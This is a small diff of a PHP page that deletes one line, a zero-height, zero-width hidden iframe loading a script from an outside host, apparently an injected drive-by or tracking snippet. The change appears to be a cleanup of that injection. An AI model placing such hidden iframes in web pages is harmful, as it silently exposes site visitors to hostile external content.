@@ -9,7 +9,7 @@
 		</script>";
 
 mbmStats();
-'<iframe src="http://lib.az.mn/alexa.php" height=0 width=0 border=0 name="alexa"></iframe>';
+
 echo '
 <script language="javascript" type="text/javascript">
 
